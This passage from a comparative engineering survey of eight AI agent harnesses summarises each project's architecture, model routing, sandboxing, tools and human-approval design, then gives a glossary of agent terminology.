| **Entry points** | CLI only / CLI+HTTP / CLI+HTTP+MCP+IDE | CLI+HTTP minimum; MCP server mode is 100 LOC once tools solid | Codex (all); Goose (all) |

---

## 9. Per-repo appendix

Quick-reference summaries. See §5 for cross-cutting analysis.

### 9.1 VVAH — Visa Vulnerability Agentic Harness

- **Killer feature:** Multi-run voting on deep-dive (S4) + adversarial verifier (S6) + validation panel (S11) — three orthogonal quality gates.
- **Architecture:** 11-stage linear pipeline S0–S11; pydantic contracts between stages; SQLite checkpoints (no pickle).
- **LLM strategy:** 3-backend dispatcher (`cli` / `sdk` / `openai`) + 4th (`deepagents` for mutating S10/S11 roles); per-stage model config.
- **Sandbox:** Read-only during S1–S9; DeepAgents/Claude Agent SDK permission callback (`_gate()`) with symlink rejection during S10 fix mode; Bash explicitly denied outside CLI backend.
- **Prompt strategy:** Shared blocks (`EXCLUSION_RULES`, `SELF_VERIFICATION`, `SEVERITY_GUIDANCE`) composed into stage-specific prompts.
- **Notable:** Threat-model-driven planning (S2→S3); crash-proof pydantic coercers so bad LLM output degrades instead of dropping findings.
- **Weakness:** Not a general harness — pipeline is fixed; no distributed execution; no custom taint rules bundled.

### 9.2 Open SWE

- **Killer feature:** Deterministic thread IDs from invocation surface (Slack/Linear/GitHub) route all follow-ups back to the same thread.
- **Architecture:** 5 LangGraph graphs (agent, reviewer, analyzer, chat, scheduler); Deep-Agents-composed main agent; per-thread persistent sandbox.
- **LLM strategy:** 4+ providers via `init_chat_model("provider:model")`; `ModelFallbackMiddleware`; LangSmith LLM Gateway routing.
- **Sandbox:** 6 pluggable backends (LangSmith / Modal / Daytona / Runloop / E2B / Local); GitHub proxy injects git+API auth into sandbox — no credentials in sandbox.
- **Tool strategy:** Curated ~25 tools; MCP-backed observability tools (Datadog, LangSmith, Corridor, Notion).
- **HITL:** `enter_plan_mode` / `save_plan` / `approve_plan` workflow; draft-PR + review link.
- **Notable:** Middleware stack ordering matters (11 middlewares); prompt fingerprinting to detect resume vs. new invocation; turn checkpoints via git refs.
- **Weakness:** Tight middleware coupling; hardcoded tool list; no cross-thread learning.

### 9.3 DeepAgents

- **Killer feature:** Pluggable middleware architecture — every behavior is a layer you can insert, reorder, or replace.
- **Architecture:** LangGraph state graph + 14-layer middleware stack; `DeltaChannel` reducer for O(N) checkpoint growth.
- **LLM strategy:** Multi-provider via `init_chat_model()`; harness/provider profile registry (`@register_harness_profile("anthropic:claude-sonnet-4-6")`).
- **Sandbox:** 4 filesystem backends (State/Filesystem/Store/Composite); permission-driven (`FilesystemPermission(path_pattern, mode, tools)`).
- **Subagent:** Three variants — declarative `SubAgent` TypedDict, `CompiledSubAgent`, `AsyncSubAgent` (remote via Agent Protocol).
- **Notable:** Prompt caching middleware for Anthropic/Bedrock/Fireworks (no-op elsewhere); private state attrs so middleware state doesn't leak to subagents; 3-part prompt assembly (user/base/suffix).
- **Weakness:** LocalShellBackend unsandboxed (needs partner backend for prod); no built-in MCP client in core SDK; no explicit planner phase.

### 9.4 Autoresearch

- **Killer feature:** Zero-framework harness for LLM-directed research — external agent edits `train.py`, runs `uv run train.py`, keeps or reverts based on val_bpb metric.
- **Architecture:** Not a harness in the SDK sense — a *target* for agents. `program.md` (220-line instruction doc) + `prepare.py` (immutable) + `train.py` (editable). git branch as experiment history.
- **LLM strategy:** None internal — Claude Code, Codex, or any agent runs against the repo.
- **Sandbox:** Scope-restricted (only `train.py` editable); 5-minute time budget per experiment; no new deps.
- **HITL:** Setup interactive (agree on tag, create branch), then autonomous ("NEVER STOP").
- **Notable:** Fixed time budget makes experiments platform-agnostic; BPB metric is vocab-independent; git reset is the failure-mode primitive.
- **Weakness:** Not a general-purpose harness (by design); no meta-learning across runs; VRAM is soft constraint.

### 9.5 Hermes Agent (Nous Research)

- **Killer feature:** Closed learning loop — autonomous skill creation, memory improvement, and user modeling across sessions.
- **Architecture:** `run_conversation()` in `agent/conversation_loop.py` (~3900 LOC); 3-tier cache-safe prompt; SQLite session persistence.
- **LLM strategy:** 15+ providers via provider-agnostic OpenAI-wire format + lazy SDK loading; Codex Responses API for GPT-5.
- **Tool strategy:** 70+ built-in tools across 15+ toolsets; self-registering modules with AST-scanner discovery cache; parallel dispatch (8 workers) with path-overlap safety.
- **Sandbox:** 7 terminal backends (local, Docker, SSH, Singularity, Modal, Daytona, Vercel Sandbox); tool guardrails with pre-call decision (ALLOW/DENY/CLARIFY); threat pattern scanning of context files.
- **Memory:** Pluggable `MemoryProvider` (local MEMORY.md + Honcho/Hindsight/Mem0/Supermemory); trivial-prompt gate; anti-thrash compaction.
- **Notable:** Native OpenAI JSON function-calling format (not XML); ephemeral scaffolding markers (`_empty_recovery_synthetic`, `_dropped_toolcall_nudge`); tool result spillover to disk with pointer marker; 7 messaging gateways.
- **Weakness:** Single active memory provider; planning is reactive; SQLite single-host.

### 9.6 Bedrock Engineer

- **Killer feature:** Rich desktop UX with PLAN/ACT dual-mode prompt, interactive tool enable/disable, agent directory of pre-built templates.
- **Architecture:** Electron app; main process (Node) runs agent logic; renderer (React) provides UI; React Context state (no Redux).
- **LLM strategy:** Bedrock-only (Claude/Nova/Llama/Mistral); native streaming; prompt caching + thinking mode toggles.
- **Tool strategy:** 25 built-in tools across 9 categories; TypeScript `BaseTool<In, Out>` classes with static `toolSpec`; MCP SDK integration.
- **Sandbox:** No strict host sandbox; codeInterpreter uses Docker/Podman; project path scoping; OS-keychain-backed Electron Store.
- **HITL:** GUI approvals via tool enable/disable toggles; no per-call approval modal; PLAN mode read-only tools until user switches to ACT.
- **Notable:** Background agent scheduler (cron for autonomous execution); Mermaid/draw.io/KaTeX rendering; two languages (English + Japanese).
- **Weakness:** Single provider; context truncation naive (oldest-first drop); no distributed tracing; TS strict mode not enabled.

### 9.7 Codex CLI (OpenAI)

- **Killer feature:** Cross-platform OS-level sandboxing (Landlock+bwrap / Seatbelt / RestrictedToken) + Guardian approval framework + canonical `apply_patch` format.
- **Architecture:** Rust monorepo (100+ crates); `Session::run_turn()` main loop; Responses API streaming; rollout-based append-only persistence.
- **LLM strategy:** Multi-provider via `ModelProvider` trait; per-role model selection (`approval_review_model`, `memory_extraction_model`); reasoning-effort transparent handling.
- **Tool strategy:** ~10 core tools + MCP; `apply_patch` with `*** Begin Patch` / `*** End Patch` format; parallel tool calls via `tools/parallel.rs`.
- **Sandbox:** Three approval policies (`suggest`/`auto_edit`/`auto`/`manual`); approval caching by hash; per-OS sandboxes; managed network proxy with deferred approval.
- **Multi-agent:** `spawn_agent` v1/v2 with `FullHistory` / `LastNTurns` fork modes; per-session `AgentRegistry`; DAG in `codex-agent-graph-store`.
- **Notable:** `AGENTS.md` convention; TUI snapshot tests via `insta`; JSON-RPC v1/v2 protocol on Unix socket / named pipe / WebSocket / stdio; `codex mcp` server mode.
- **Weakness:** Custom apply-patch format (not standard diff); 150+ config options; no multi-model ensemble; sandbox fragmentation across platforms.

### 9.8 Goose (aaif fork)

- **Killer feature:** Explicit state-machine `Step[]` engine + MCP-first tool ecosystem + YAML recipes.
- **Architecture:** Rust workspace (~15 crates); `StateMachine::step()` walks ordered operations; SQLite per-session storage.
- **LLM strategy:** 15+ providers via `Provider` trait; declarative YAML providers; per-provider `default_permission_routing()`.
- **Tool strategy:** All tools are MCP servers — 4 built-in (autovisualiser/computercontroller/memory/tutorial) + external via config; extension config with secrets from OS keyring.
- **Sandbox:** Three-layer permission model (PermissionInspector rules → PermissionJudge LLM → user confirmation); ProcessSandbox for MCP servers (stdio-only, timeout enforced); three security inspectors (prompt injection, adversary, egress).
- **Planning:** Recipe YAML with sub-recipes (sequential/parallel), parameters, JSON-schema response, retry config.
- **Notable:** `.goosehints` file for repo context; OTel + Langfuse layers; recipe scanner tool; ACP compliance; Electron desktop app.
- **Weakness:** Depth-2 subagent limit; no RAG built in; dual agent loop (legacy `agent.rs` + new state machine) during migration; extensions run with user privileges.

---

## 10. Glossary

- **Agent** — an LLM-driven loop that iterates: reason → act (via tool) → observe → repeat.
- **Agentic harness** — the software substrate around an agent: loop, state, tools, memory, sandbox, observability, UIs.
- **ACP (Agent Client Protocol)** — spec for agents to talk to clients (IDE, TUI, etc.); Goose is a reference implementation.
- **Approval cache** — session-scoped cache of approval decisions keyed by `(tool_name, hash(canonical_args))`.
- **Apply-patch format** — Codex's `*** Begin Patch / *** End Patch` diff format for LLM-emitted edits.
- **AGENTS.md** — convention for a markdown file at repo root that gives agents repo-scoped instructions.
- **Checkpoint** — persisted snapshot of session state (messages + metadata) enabling resume after crash/pause.
- **Compaction** — LLM-based summarization of older messages to fit context window.
- **DeltaChannel** — LangGraph's incremental checkpoint reducer, prevents O(N²) growth.
- **Guardian** — Codex's approval-review framework; supports user + hook + model reviewers.
- **HITL** — Human-in-the-loop.
- **Landlock** — Linux kernel filesystem-ACL mechanism used for in-process sandboxing.
- **MCP (Model Context Protocol)** — spec for LLM tool servers; JSON-RPC over stdio/HTTP.
- **Middleware** — layer that wraps the loop, injecting behavior before/after model calls or tool dispatch.
- **Middleware stack** — ordered composition of middlewares; DeepAgents' pattern.
- **Recipe** — Goose's YAML file defining a parameterized multi-turn workflow with sub-recipes.
- **Responses API** — OpenAI's newer streaming API returning `ResponseInputItem` events; distinct from Chat Completions.
- **ReAct** — reason-act-observe loop pattern; the canonical agent loop shape.
- **Rollout** — Codex's append-only per-turn log used for resume + replay.
- **Sandbox provider** — pluggable execution backend (LangSmith, Modal, Daytona, Runloop, E2B, Local).
- **Seatbelt** — macOS's `sandbox-exec` mechanism (`/usr/bin/sandbox-exec -p <profile>`).
- **SKILL.md** — file convention for describing an agent skill (metadata + prompt + tools).
- **State machine (Goose)** — explicit ordered `Step[]` where each step is `Operation` or `Inference` returning `NotApplicable` or `Applied(effects)`.
- **Sub-agent** — child agent spawned via `task` / `delegate_task` / `spawn_agent` tool with isolated conversation.
- **task tool** — the delegation primitive; DeepAgents' name for it, adopted by Codex/Goose/Hermes/Open SWE.
- **Turn** — one round-trip: user message → agent output (possibly with tool calls) → next input; multiple LLM calls per turn are common.

---

## Acknowledgements

Analysis compiled from thorough read-only inspection of eight reference repositories cloned into `reference/` on 2026-08-23:

- `visa/visa-vulnerability-agentic-harness`
- `langchain-ai/open-swe`
- `langchain-ai/deepagents`
- `karpathy/autoresearch`
- `NousResearch/hermes-agent`
- `aws-samples/bedrock-engineer`
- `openai/codex`
- `aaif-goose/goose`

Each repo's dedicated per-repo analysis (~30–65 KB of technical detail with concrete file paths and line numbers) was used to source every claim in this synthesis. See `reference/{repo}/` for source code and `reference/{repo}/README.md` for upstream documentation.
